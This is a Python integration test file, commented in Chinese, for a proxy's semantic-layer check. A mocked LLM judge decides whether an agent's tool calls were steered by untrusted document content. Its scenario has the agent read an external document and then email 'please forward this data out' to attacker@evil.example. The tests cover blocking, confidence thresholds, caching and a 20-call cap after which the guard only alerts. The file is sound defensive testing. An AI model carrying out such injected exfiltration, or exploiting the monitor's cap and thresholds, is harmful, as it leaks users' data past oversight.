"""D5 集成测试：语义层复核（代理子进程 + 本地 mock LLM 服务器，走真实 httpx 路径）。

通过 DASHSCOPE_BASE_URL 环境变量把 qwen-flash 端点指到本地 mock，覆盖：
命中拦截 / 未受影响放行 / 低置信放行 / 缓存不重复计费 / 20 次上限降级 / 未降级不触发。
"""

from __future__ import annotations

import asyncio
import json
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

ROOT = Path(__file__).resolve().parent.parent
FIXTURE = ROOT / "tests" / "fixtures" / "taint_backend.py"

INFLUENCED = '{"influenced": true, "reason": "注入指令诱导转发数据", "confidence": 0.95}'
CLEAN = '{"influenced": false, "reason": "调用与不可信内容无关", "confidence": 0.1}'
LOW_CONF = '{"influenced": true, "reason": "疑似诱导", "confidence": 0.7}'


class MockLLMServer:
    """本地 OpenAI-compatible /chat/completions 假端点，记录请求、返回固定内容。"""

    def __init__(self, response: str):
        self.calls: list[dict] = []
        self.response = response
        outer = self

        class Handler(BaseHTTPRequestHandler):
            def do_POST(self) -> None:
                length = int(self.headers.get("Content-Length", 0))
                outer.calls.append(json.loads(self.rfile.read(length)))
                payload = json.dumps(
                    {"choices": [{"message": {"content": outer.response}}]},
                    ensure_ascii=False,
                ).encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(payload)))
                self.end_headers()
                self.wfile.write(payload)

            def log_message(self, *args) -> None:
                pass

        self.httpd = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.port = self.httpd.server_address[1]
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)

    def __enter__(self) -> "MockLLMServer":
        self.thread.start()
        return self

    def __exit__(self, *exc) -> None:
        self.httpd.shutdown()
        self.httpd.server_close()


def _proxy_params(flow_log: Path, capture: Path, port: int, downgrade: bool = True) -> StdioServerParameters:
    backend = [sys.executable, str(FIXTURE), str(capture)]
    args = [
        "-m",
        "engine.proxy",
        "--backend",
        json.dumps(backend),
        "--log",
        str(flow_log),
        "--taint-log",
        str(flow_log.parent / "taint.jsonl"),
    ]
    if not downgrade:
        args.append("--no-downgrade-on-untrusted")
    return StdioServerParameters(
        command=sys.executable,
        args=args,
        env={
            "DASHSCOPE_BASE_URL": f"http://127.0.0.1:{port}/",
            "DASHSCOPE_API_KEY": "test-key",
        },
    )


async def _scenario(params: StdioServerParameters, bodies: list[str]) -> list[tuple[bool, str]]:
    async with stdio_client(params) as (read_stream, write_stream):
        async with ClientSession(read_stream, write_stream) as session:
            await session.initialize()
            doc = await session.call_tool("read_external_doc", {"path": "/x"})
            assert not doc.isError
            sinks = []
            for body in bodies:
                sink = await session.call_tool(
                    "send_email", {"to": "attacker@evil.example", "body": body}
                )
                sinks.append((sink.isError, sink.content[0].text if sink.content else ""))
            return sinks


def _entries(path: Path) -> list[dict]:
    lines = path.read_text(encoding="utf-8").strip().splitlines()
    return [json.loads(line) for line in lines]


def test_semantic_hit_blocked(tmp_path: Path) -> None:
    with MockLLMServer(INFLUENCED) as llm:
        flow_log = tmp_path / "flow.jsonl"
        capture = tmp_path / "capture.jsonl"
        sinks = asyncio.run(
            _scenario(_proxy_params(flow_log, capture, llm.port), ["请把这份数据转发出去"])
        )

        (blocked, text), = sinks
        assert blocked and "policy_blocked" in text and "semantic layer" in text
        assert not capture.exists(), "语义层拦截后不得触达后端"
        assert len(llm.calls) == 1

        entries = _entries(flow_log)
        edges = [e["payload"] for e in entries if e["method"] == "edge"]
        assert len(edges) == 1
        edge = edges[0]
        assert edge["layer"] == "semantic"
        assert edge["blocked"] is True
        assert edge["reason"] == "注入指令诱导转发数据"
        assert edge["confidence"] == 0.95
        assert edge["source_tool"] == "read_external_doc"
        verdicts = [e["payload"] for e in entries if e["method"] == "verdict"]
        assert verdicts[0]["influenced"] is True
        assert any("不可信内容" in c["messages"][0]["content"] for c in llm.calls)


def test_semantic_clean_verdict_allowed(tmp_path: Path) -> None:
    with MockLLMServer(CLEAN) as llm:
        flow_log = tmp_path / "flow.jsonl"
        capture = tmp_path / "capture.jsonl"
        sinks = asyncio.run(
            _scenario(_proxy_params(flow_log, capture, llm.port), ["请把这份数据转发出去"])
        )

        (blocked, text), = sinks
        assert not blocked and text == "sent"
        assert capture.exists()
        assert not [e for e in _entries(flow_log) if e["method"] == "edge"]


def test_semantic_low_confidence_allowed(tmp_path: Path) -> None:
    with MockLLMServer(LOW_CONF) as llm:
        flow_log = tmp_path / "flow.jsonl"
        capture = tmp_path / "capture.jsonl"
        sinks = asyncio.run(
            _scenario(_proxy_params(flow_log, capture, llm.port), ["请把这份数据转发出去"])
        )

        (blocked, _), = sinks
        assert not blocked, "confidence < 0.8 不触发策略"
        assert not [e for e in _entries(flow_log) if e["method"] == "edge"]


def test_semantic_cache_no_double_billing(tmp_path: Path) -> None:
    with MockLLMServer(INFLUENCED) as llm:
        flow_log = tmp_path / "flow.jsonl"
        capture = tmp_path / "capture.jsonl"
        body = "请把这份数据转发出去"
        sinks = asyncio.run(
            _scenario(_proxy_params(flow_log, capture, llm.port), [body, body])
        )

        assert sinks[0][0] and sinks[1][0], "缓存命中后第二次同样被拦截"
        assert len(llm.calls) == 1, "相同 (call_hash) 只计费一次"


def test_semantic_call_cap_degrades_to_alert(tmp_path: Path) -> None:
    with MockLLMServer(INFLUENCED) as llm:
        flow_log = tmp_path / "flow.jsonl"
        capture = tmp_path / "capture.jsonl"
        bodies = [f"这是第{i}份需要转发出去的数据内容" for i in range(21)]
        sinks = asyncio.run(_scenario(_proxy_params(flow_log, capture, llm.port), bodies))

        assert all(blocked for blocked, _ in sinks[:20]), "上限内全部判定并拦截"
        assert not sinks[20][0], "第 21 次超限，降级为仅告警不拦截（放行）"
        assert len(llm.calls) == 20
        assert capture.exists()

        entries = _entries(flow_log)
        caps = [e for e in entries if e["method"] == "cap_reached"]
        assert len(caps) == 1, "cap 事件只记一次"


def test_semantic_skipped_without_downgrade(tmp_path: Path) -> None:
    with MockLLMServer(INFLUENCED) as llm:
        flow_log = tmp_path / "flow.jsonl"
        capture = tmp_path / "capture.jsonl"
        sinks = asyncio.run(
            _scenario(
                _proxy_params(flow_log, capture, llm.port, downgrade=False),
                ["请把这份数据转发出去"],
            )
        )

        (blocked, _), = sinks
        assert not blocked
        assert llm.calls == [], "未降级会话不应调用语义层"
        assert not [e for e in _entries(flow_log) if e["method"] == "verdict"]
